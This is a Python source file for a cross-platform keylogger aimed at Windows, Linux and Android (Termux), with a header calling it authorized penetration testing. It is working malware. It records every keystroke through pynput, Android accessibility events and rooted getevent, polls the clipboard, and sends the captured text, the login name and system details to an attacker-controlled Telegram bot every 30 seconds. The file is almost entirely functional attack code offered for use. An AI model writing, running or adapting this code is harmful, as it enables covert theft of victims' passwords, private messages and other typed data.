#!/usr/bin/env python3
"""
Cross-Platform Keylogger (Windows + Android)
Purpose: Authorized penetration testing - captures keystrokes and exfiltrates via Telegram
Targets: Windows (pynput) and Android (adb shell input / Termux)
"""

import os
import sys
import time
import platform
import threading
import requests
import json
import logging
from datetime import datetime

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # Replace with your chat ID
SEND_INTERVAL = 30                           # Seconds between sending keystrokes
BUFFER_FILE = ".key_buffer.txt"              # Local buffer file
# ========================================================

# Suppress pynput warnings on Windows
logging.disable(logging.CRITICAL)

# Global buffer
key_buffer = []
buffer_lock = threading.Lock()

def send_telegram(message):
    """Send message to Telegram bot."""
    if not message.strip():
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        # Split long messages (Telegram limit ~4096 chars)
        for i in range(0, len(message), 4000):
            chunk = message[i:i+4000]
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": chunk, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
    except Exception as e:
        # Fallback: write to local file
        with open(BUFFER_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] Send failed: {e}\n{message}\n")

def flush_buffer():
    """Send buffered keystrokes to Telegram."""
    global key_buffer
    with buffer_lock:
        if not key_buffer:
            return
        data = "".join(key_buffer)
        key_buffer = []
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    header = f"🔑 <b>Keylog Report</b>\n🕒 {timestamp}\n📱 {platform.system()} {platform.release()}\n\n<pre>"
    footer = "</pre>"
    
    send_telegram(header + data + footer)

def periodic_flush():
    """Background thread to flush buffer periodically."""
    while True:
        time.sleep(SEND_INTERVAL)
        flush_buffer()

# ==================== WINDOWS KEYLOGGER ====================
def windows_keylogger():
    """Keylogger for Windows using pynput."""
    try:
        from pynput import keyboard
    except ImportError:
        os.system("pip install pynput -q")
        from pynput import keyboard

    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.delete: "[DELETE]",
        keyboard.Key.esc: "[ESC]",
        keyboard.Key.shift: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.ctrl: "",
        keyboard.Key.ctrl_r: "",
        keyboard.Key.alt: "",
        keyboard.Key.alt_r: "",
        keyboard.Key.cmd: "",
        keyboard.Key.caps_lock: "[CAPS]",
        keyboard.Key.up: "[UP]",
        keyboard.Key.down: "[DOWN]",
        keyboard.Key.left: "[LEFT]",
        keyboard.Key.right: "[RIGHT]",
        keyboard.Key.home: "[HOME]",
        keyboard.Key.end: "[END]",
        keyboard.Key.page_up: "[PGUP]",
        keyboard.Key.page_down: "[PGDN]",
        keyboard.Key.f1: "[F1]",
        keyboard.Key.f2: "[F2]",
        keyboard.Key.f3: "[F3]",
        keyboard.Key.f4: "[F4]",
        keyboard.Key.f5: "[F5]",
        keyboard.Key.f6: "[F6]",
        keyboard.Key.f7: "[F7]",
        keyboard.Key.f8: "[F8]",
        keyboard.Key.f9: "[F9]",
        keyboard.Key.f10: "[F10]",
        keyboard.Key.f11: "[F11]",
        keyboard.Key.f12: "[F12]",
    }

    def on_press(key):
        try:
            with buffer_lock:
                if hasattr(key, 'char') and key.char is not None:
                    key_buffer.append(key.char)
                else:
                    mapped = special_keys.get(key, f"[{key.name.upper()}]")
                    key_buffer.append(mapped)
        except Exception:
            pass

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ==================== ANDROID KEYLOGGER ====================
def android_keylogger():
    """
    Android keylogger using Termux accessibility API.
    
    Prerequisites (install on Android device):
        pkg update && pkg upgrade
        pkg install python
        pip install requests
        pkg install termux-api
        
    Enable accessibility service:
        Settings > Accessibility > Termux:API > Enable
        
    This captures keyboard input events via the accessibility service.
    """
    
    def check_termux():
        """Check if running in Termux environment."""
        try:
            result = os.popen("uname -o 2>/dev/null").read().strip()
            return "Android" in result or os.path.exists("/data/data/com.termux")
        except:
            return False
    
    def send_keylog_android(text):
        """Send keylog from Android."""
        if not text.strip():
            return
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        header = f"🤖 <b>Android Keylog</b>\n🕒 {timestamp}\n\n<pre>"
        footer = "</pre>"
        send_telegram(header + text + footer)
    
    # Method 1: Capture using Termux:API accessibility service
    def accessibility_method():
        """Use Termux accessibility service to capture input."""
        # Start accessibility service listener
        cmd = "termux-accessibility -e 2>&1"
        process = os.popen(cmd)
        buffer = []
        
        while True:
            try:
                line = process.readline()
                if line:
                    buffer.append(line)
                    if len(buffer) >= 20:  # Flush every 20 events
                        send_keylog_android("".join(buffer))
                        buffer = []
                else:
                    time.sleep(0.1)
            except:
                time.sleep(1)
    
    # Method 2: Log input events from /dev/input/ (requires root)
    def input_event_method():
        """Capture input events directly (requires root)."""
        cmd = "su -c 'getevent -lt /dev/input/event*' 2>/dev/null"
        process = os.popen(cmd)
        buffer = []
        
        while True:
            try:
                line = process.readline()
                if line:
                    buffer.append(line)
                    if len(buffer) >= 10:
                        send_keylog_android("".join(buffer))
                        buffer = []
                else:
                    time.sleep(0.1)
            except:
                time.sleep(1)
    
    # Method 3: Use clipboard monitoring as fallback
    def clipboard_method():
        """Monitor clipboard changes (useful for copy/paste operations)."""
        last_clip = ""
        while True:
            try:
                clip = os.popen("termux-clipboard-get 2>/dev/null").read().strip()
                if clip and clip != last_clip:
                    last_clip = clip
                    send_keylog_android(f"[CLIPBOARD] {clip}\n")
                time.sleep(2)
            except:
                time.sleep(5)
    
    if not check_termux():
        print("[!] Not running in Termux. Android keylogger requires Termux.")
        print("[*] Install: pkg install python termux-api && pip install requests")
        return
    
    print("[*] Starting Android keylogger...")
    print("[*] Ensure Termux:API accessibility service is enabled in Settings")
    
    threads = []
    
    # Try accessibility method first
    t1 = threading.Thread(target=accessibility_method, daemon=True)
    t1.start()
    threads.append(t1)
    
    # Clipboard monitoring as supplement
    t2 = threading.Thread(target=clipboard_method, daemon=True)
    t2.start()
    threads.append(t2)
    
    # Try input event method if root available
    try:
        su_test = os.popen("su -c 'id' 2>/dev/null").read()
        if "uid=0" in su_test:
            t3 = threading.Thread(target=input_event_method, daemon=True)
            t3.start()
            threads.append(t3)
    except:
        pass
    
    for t in threads:
        t.join()

# ==================== MAIN ====================
def main():
    """Main entry point - detects platform and starts appropriate keylogger."""
    print("""
    ╔══════════════════════════════════════╗
    ║   Cross-Platform Keylogger v2.0      ║
    ║   Authorized Penetration Testing     ║
    ╚══════════════════════════════════════╝
    """)
    
    print(f"[*] Target OS: {platform.system()} {platform.release()}")
    print(f"[*] Telegram: @{TELEGRAM_BOT_TOKEN.split(':')[0] if ':' in TELEGRAM_BOT_TOKEN else '...'}")
    print(f"[*] Send interval: {SEND_INTERVAL}s")
    print("[*] Starting keylogger...\n")
    
    # Start periodic flush thread
    flush_thread = threading.Thread(target=periodic_flush, daemon=True)
    flush_thread.start()
    
    # Send startup notification
    startup_msg = f"🚀 <b>Keylogger Started</b>\n💻 {platform.system()} {platform.release()}\n🆔 {os.getlogin() if hasattr(os, 'getlogin') else 'N/A'}\n🕒 {datetime.now()}"
    send_telegram(startup_msg)
    
    try:
        if platform.system() == "Windows":
            windows_keylogger()
        elif platform.system() == "Linux" and os.path.exists("/data/data/com.termux"):
            android_keylogger()
        elif platform.system() == "Linux":
            # Could also be Linux desktop - try pynput
            print("[*] Detected Linux. Attempting pynput keylogger...")
            try:
                windows_keylogger()  # pynput works on Linux too
            except:
                print("[!] pynput failed. Install: pip install pynput")
                print("[*] Or run on Android with Termux")
        else:
            print(f"[!] Unsupported platform: {platform.system()}")
    except KeyboardInterrupt:
        print("\n[*] Stopping keylogger...")
        flush_buffer()
        send_telegram(f"🛑 <b>Keylogger Stopped</b>\n🕒 {datetime.now()}")
    except Exception as e:
        print(f"[!] Error: {e}")
        try:
            send_telegram(f"⚠️ <b>Keylogger Error</b>\n{str(e)}")
        except:
            pass

if __name__ == "__main__":
    main()
